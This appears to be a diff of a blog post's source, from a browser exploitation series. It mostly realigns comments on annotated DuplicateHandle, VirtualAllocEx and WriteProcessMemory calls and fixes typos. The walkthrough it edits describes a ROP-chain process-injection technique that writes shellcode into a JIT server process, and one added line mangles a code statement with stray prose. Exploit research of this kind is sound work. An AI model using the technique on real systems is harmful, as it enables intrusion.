@@ -2402,6 +2402,8 @@ Let's now start working on our exploit in order to achieve execution of our fina
 
 `DuplicateHandle` ROP Chain
 ---
+Before we begin, each ROP gadget I write has an associated commetn. My blog will sometimes cut these off when I paste a code snippet, and you might be required to slide the bar under the code snippet to the right to see comments.
+
 We have, as we have seen, already prepared what we are eventually going to execute within the JIT process. However, we still have to figure out _how_ we are going to inject these into the JIT process, and begin code execution. This journey to this goal begins with our overwritten return address, causing control-flow hijacking, to start our ROP chain (just like in part two of this blog series). However, instead of directly executing a ROP chain to call `WinExec`, we will be chaining together _multiple_ ROP chains in order to achieve this goal. Everything that happens in our exploit now happens in the content process (for the foreseeable future).
 
 A caveat before we begin. Everything, from here on out, will begin at these lines of our exploit:
@@ -2666,7 +2668,7 @@ DuplicateHandle(
 	-
 	GetCurrentProcess(),	// Pseudo handle to the current process
 	GetCurrentProcess(),	// Pseudo handle to the current process
-	&fulljitHandle,			// Variable we supply that will receive the PROCESS_ALL_ACCESS handle to the JIT server
+	&fulljitHandle,		// Variable we supply that will receive the PROCESS_ALL_ACCESS handle to the JIT server
 	-
 	-
 	-
@@ -2687,10 +2689,10 @@ Our call to `DuplicateHandle` is now at the following state:
 
 ```c
 DuplicateHandle(
-	jitHandle,				// Leaked from s_jitManager+0x8 with PROCESS_DUP_HANDLE permissions
+	jitHandle,		// Leaked from s_jitManager+0x8 with PROCESS_DUP_HANDLE permissions
 	GetCurrentProcess(),	// Pseudo handle to the current process
 	GetCurrentProcess(),	// Pseudo handle to the current process
-	&fulljitHandle,			// Variable we supply that will receive the PROCESS_ALL_ACCESS handle to the JIT server
+	&fulljitHandle,		// Variable we supply that will receive the PROCESS_ALL_ACCESS handle to the JIT server
 	-
 	-
 	-
@@ -2764,12 +2766,12 @@ Our call to `DuplicateHandle` is in its final state:
 
 ```c
 DuplicateHandle(
-	jitHandle,				// Leaked from s_jitManager+0x8 with PROCESS_DUP_HANDLE permissions
+	jitHandle,		// Leaked from s_jitManager+0x8 with PROCESS_DUP_HANDLE permissions
 	GetCurrentProcess(),	// Pseudo handle to the current process
 	GetCurrentProcess(),	// Pseudo handle to the current process
-	&fulljitHandle,			// Variable we supply that will receive the PROCESS_ALL_ACCESS handle to the JIT server
-	0,						// NULL since we will set dwOptions to DUPLICATE_SAME_ACCESS
-	0,						// FALSE (new handle isn't inherited)
+	&fulljitHandle,		// Variable we supply that will receive the PROCESS_ALL_ACCESS handle to the JIT server
+	0,			// NULL since we will set dwOptions to DUPLICATE_SAME_ACCESS
+	0,			// FALSE (new handle isn't inherited)
 	DUPLICATE_SAME_ACCESS	// Duplicate handle has same access as source handle (source handle is an all access handle, e.g. a pseudo handle), meaning the duplicated handle will be PROCESS_ALL_ACCESS
 );
 ```
@@ -2809,11 +2811,11 @@ The function call will be as follows for us:
 
 ```c
 VirtualAllocEx(
-	fulljitHandle, 				// PROCESS_ALL_ACCESS handle to JIT server we got from DuplicateHandle call
-	NULL,						// Setting to NULL. Let VirtualAllocEx decide where our memory will be allocated in the JIT process
-	sizeof(shellcode),			// Our shellcode is currently in the .data section of chakra.dll in the content process. Tell VirtualAllocEx the size of our allocation we want to make in the JIT process is sizeof(shellcode)
+	fulljitHandle, 			// PROCESS_ALL_ACCESS handle to JIT server we got from DuplicateHandle call
+	NULL,				// Setting to NULL. Let VirtualAllocEx decide where our memory will be allocated in the JIT process
+	sizeof(shellcode),		// Our shellcode is currently in the .data section of chakra.dll in the content process. Tell VirtualAllocEx the size of our allocation we want to make in the JIT process is sizeof(shellcode)
 	MEM_COMMIT | MEM_RESERVE,	// Reserve our memory and commit it to memory in one go
-	PAGE_READWRITE				// Make our memory readable and writable
+	PAGE_READWRITE			// Make our memory readable and writable
 );
 ```
 
@@ -3068,7 +3070,7 @@ Our call to `VirtualAllocEx` is now in the following state:
 VirtualAllocEx(
 	-
 	-
-	sizeof(shellcode),			// Our shellcode is currently in the .data section of chakra.dll in the content process. Tell VirtualAllocEx the size of our allocation we want to make in the JIT process is sizeof(shellcode)
+	sizeof(shellcode),		// Our shellcode is currently in the .data section of chakra.dll in the content process. Tell VirtualAllocEx the size of our allocation we want to make in the JIT process is sizeof(shellcode)
 	MEM_COMMIT | MEM_RESERVE,	// Reserve our memory and commit it to memory in one go
 	-
 );
@@ -3083,8 +3085,8 @@ After executing the above ROP gadgets, our call to `VirtualAllocEx` is in the fo
 ```c
 VirtualAllocEx(
 	-
-	NULL,						// Setting to NULL. Let VirtualAllocEx decide where our memory will be allocated in the JIT process
-	sizeof(shellcode),			// Our shellcode is currently in the .data section of chakra.dll in the content process. Tell VirtualAllocEx the size of our allocation we want to make in the JIT process is sizeof(shellcode)
+	NULL,				// Setting to NULL. Let VirtualAllocEx decide where our memory will be allocated in the JIT process
+	sizeof(shellcode),		// Our shellcode is currently in the .data section of chakra.dll in the content process. Tell VirtualAllocEx the size of our allocation we want to make in the JIT process is sizeof(shellcode)
 	MEM_COMMIT | MEM_RESERVE,	// Reserve our memory and commit it to memory in one go
 	-
 );
@@ -3110,9 +3112,9 @@ Our call to `VirtualAllocEx` is now in the following state:
 
 ```c
 VirtualAllocEx(
-	fulljitHandle, 				// PROCESS_ALL_ACCESS handle to JIT server we got from DuplicateHandle call
-	NULL,						// Setting to NULL. Let VirtualAllocEx decide where our memory will be allocated in the JIT process
-	sizeof(shellcode),			// Our shellcode is currently in the .data section of chakra.dll in the content process. Tell VirtualAllocEx the size of our allocation we want to make in the JIT process is sizeof(shellcode)
+	fulljitHandle, 			// PROCESS_ALL_ACCESS handle to JIT server we got from DuplicateHandle call
+	NULL,				// Setting to NULL. Let VirtualAllocEx decide where our memory will be allocated in the JIT process
+	sizeof(shellcode),		// Our shellcode is currently in the .data section of chakra.dll in the content process. Tell VirtualAllocEx the size of our allocation we want to make in the JIT process is sizeof(shellcode)
 	MEM_COMMIT | MEM_RESERVE,	// Reserve our memory and commit it to memory in one go
 	-
 );
@@ -3134,11 +3136,11 @@ When this occurs, our call will be in the following (final) state:
 
 ```c
 VirtualAllocEx(
-	fulljitHandle, 				// PROCESS_ALL_ACCESS handle to JIT server we got from DuplicateHandle call
-	NULL,						// Setting to NULL. Let VirtualAllocEx decide where our memory will be allocated in the JIT process
-	sizeof(shellcode),			// Our shellcode is currently in the .data section of chakra.dll in the content process. Tell VirtualAllocEx the size of our allocation we want to make in the JIT process is sizeof(shellcode)
+	fulljitHandle, 			// PROCESS_ALL_ACCESS handle to JIT server we got from DuplicateHandle call
+	NULL,				// Setting to NULL. Let VirtualAllocEx decide where our memory will be allocated in the JIT process
+	sizeof(shellcode),		// Our shellcode is currently in the .data section of chakra.dll in the content process. Tell VirtualAllocEx the size of our allocation we want to make in the JIT process is sizeof(shellcode)
 	MEM_COMMIT | MEM_RESERVE,	// Reserve our memory and commit it to memory in one go
-	PAGE_READWRITE				// Make our memory readable and writable
+	PAGE_READWRITE			// Make our memory readable and writable
 );
 ```
 
@@ -3169,11 +3171,11 @@ Here is how our call to `WriteProcessMemory` will look:
 
 ```c
 WriteProcessMemory(
-	fulljitHandle, 								// PROCESS_ALL_ACCESS handle to JIT server we got from DuplicateHandle call
+	fulljitHandle, 					// PROCESS_ALL_ACCESS handle to JIT server we got from DuplicateHandle call
 	addressof(VirtualAllocEx_Allocation),		// Address of our return value from VirtualAllocEx (where we want to write our shellcode)
 	addressof(data_chakra_shellcode_location),	// Address of our shellcode in the content process (.data of chakra) (what we want to write (our shellcode))
-	sizeof(shellcode)							// Size of our shellcode
-	NULL 										// Optional
+	sizeof(shellcode)				// Size of our shellcode
+	NULL 						// Optional
 );
 ```
 
@@ -3383,7 +3385,7 @@ next();
 write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
 next();
 write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)         
-next();
+next();is in its final state
 write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000004, 0x00000000);             // DWORD flProtect (RSP+0x28) (PAGE_READWRITE)
 next();
 write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
@@ -3519,7 +3521,7 @@ WriteProcessMemory(
 	-
 	-
 	-
-	sizeof(shellcode)							// Size of our shellcode
+	sizeof(shellcode)				// Size of our shellcode
 	-
 );
 ```
@@ -3534,10 +3536,10 @@ Our call to `WriteProcessMemory` is now in the following state:
 
 ```c
 WriteProcessMemory(
-	fulljitHandle, 								// PROCESS_ALL_ACCESS handle to JIT server we got from DuplicateHandle call
+	fulljitHandle, 					// PROCESS_ALL_ACCESS handle to JIT server we got from DuplicateHandle call
 	-
 	-
-	sizeof(shellcode)							// Size of our shellcode
+	sizeof(shellcode)				// Size of our shellcode
 	-
 );
 ```
@@ -3564,10 +3566,10 @@ Our call to `WriteProcessMemory` is now in the following state:
 
 ```c
 WriteProcessMemory(
-	fulljitHandle, 								// PROCESS_ALL_ACCESS handle to JIT server we got from DuplicateHandle call
+	fulljitHandle, 					// PROCESS_ALL_ACCESS handle to JIT server we got from DuplicateHandle call
 	addressof(VirtualAllocEx_Allocation),		// Address of our return value from VirtualAllocEx (where we want to write our shellcode)
 	-
-	sizeof(shellcode)							// Size of our shellcode
+	sizeof(shellcode)				// Size of our shellcode
 	-
 );
 ```
@@ -3582,15 +3584,15 @@ Our call is now in the following state:
 
 ```c
 WriteProcessMemory(
-	fulljitHandle, 								// PROCESS_ALL_ACCESS handle to JIT server we got from DuplicateHandle call
+	fulljitHandle, 					// PROCESS_ALL_ACCESS handle to JIT server we got from DuplicateHandle call
 	addressof(VirtualAllocEx_Allocation),		// Address of our return value from VirtualAllocEx (where we want to write our shellcode)
 	addressof(data_chakra_shellcode_location),	// Address of our shellcode in the content process (.data of chakra) (what we want to write (our shellcode))
-	sizeof(shellcode)							// Size of our shellcode
-	NULL 										// Optional
+	sizeof(shellcode)				// Size of our shellcode
+	NULL 						// Optional
 );
 ```
 
-The last items on the agenda are two load `kernelbase!WriteProcessMemory` into RAX and `jmp` to it, and also write our last parameter to the stack at RSP + `0x28` (NULL/`0` value).
+The last items on the agenda are to load `kernelbase!WriteProcessMemory` into RAX and `jmp` to it, and also write our last parameter to the stack at RSP + `0x28` (NULL/`0` value).
 
 <img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion116.png" alt="">
 
